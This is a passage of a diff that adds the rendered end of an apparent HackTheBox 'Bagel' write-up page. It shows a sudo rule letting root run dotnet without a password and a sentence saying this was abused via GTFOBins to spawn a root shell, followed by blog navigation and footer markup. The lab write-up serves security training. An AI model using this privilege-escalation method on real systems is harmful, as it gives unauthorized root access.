+</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="nx">root</span><span class="p">)</span> <span class="nx">NOPASSWD</span><span class="o">:</span> <span class="err">/usr/bin/dotnet</span>
+</span></span></code></pre></div><p>Checking GTFO bins, we can see spawn an interactive shell and then use <code>System.Diagnostic.Process.Start</code> method spawn any child process, now since <code>donet</code> was running as root, we were able to get the shell as <code>root</code></p>
+<p><a href="https://gtfobins.github.io/gtfobins/dotnet/" target="_blank" rel="noreferrer">https://gtfobins.github.io/gtfobins/dotnet/</a></p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/img/Bagel_299b40e8bc344ae7904cea7a0b1ed5cf/Untitled_12.png" alt="" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+
+      </div>
+    </section>
+    <footer class="max-w-prose pt-8 print:hidden">
+      
+  <div class="flex">
+    
+    
+    
+    <div class="place-self-center">
+      
+      
+      <div class="text-2xl sm:text-lg">
+</div>
+    </div>
+  </div>
+
+
+      
+
+      
+  
+    
+    
+    
+    <div class="pt-8">
+      <hr class="border-dotted border-neutral-300 dark:border-neutral-600" />
+      <div class="flex justify-between pt-3">
+        <span>
+          
+            <a class="group flex" href="/blog/precious-htb/">
+              <span
+                class="me-2 text-neutral-700 transition-transform group-hover:-translate-x-[2px] group-hover:text-primary-600 dark:text-neutral dark:group-hover:text-primary-400"
+                ><span class="ltr:inline rtl:hidden">&larr;</span
+                ><span class="ltr:hidden rtl:inline">&rarr;</span></span
+              >
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >HackTheBox - Precious</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2023-05-20 00:00:00 &#43;0000 UTC">20 May 2023</time>
+                  
+                </span>
+              </span>
+            </a>
+          
+        </span>
+        <span>
+          
+            <a class="group flex text-right" href="/blog/soccer-htb/">
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >HackTheBox - Soccer</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2023-06-10 00:00:00 &#43;0000 UTC">10 June 2023</time>
+                  
+                </span>
+              </span>
+              <span
+                class="ms-2 text-neutral-700 transition-transform group-hover:-translate-x-[-2px] group-hover:text-primary-600 dark:text-neutral dark:group-hover:text-primary-400"
+                ><span class="ltr:inline rtl:hidden">&rarr;</span
+                ><span class="ltr:hidden rtl:inline">&larr;</span></span
+              >
+            </a>
+          
+        </span>
+      </div>
+    </div>
+  
+
+
+      
+    </footer>
+  </article>
+
+        
+          <div class="pointer-events-none absolute bottom-0 end-0 top-[100vh] w-12">
+            <a
+              href="#the-top"
+              class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 backdrop-blur hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+              aria-label="Scroll to top"
+              title="Scroll to top"
+            >
+              &uarr;
+            </a>
+          </div>
+        
+      </main><footer class="py-10 print:hidden">
+  
+  
+  <div class="flex items-center justify-between">
+    <div>
+      
+      
+        <p class="text-sm text-neutral-500 dark:text-neutral-400">
+            &copy;
+            2024
+            
+        </p>
+      
+      
+      
+        <p class="text-xs text-neutral-500 dark:text-neutral-400">
+          
+          
+          Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+            href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href="https://github.com/jpanther/congo" target="_blank" rel="noopener noreferrer">Congo</a>
+        </p>
+      
+    </div>
+    <div class="flex flex-row items-center">
+      
+      
+      
+      
+    </div>
+  </div>
+  
+  
+</footer>
+
+    </div>
+  </body>
+</html>
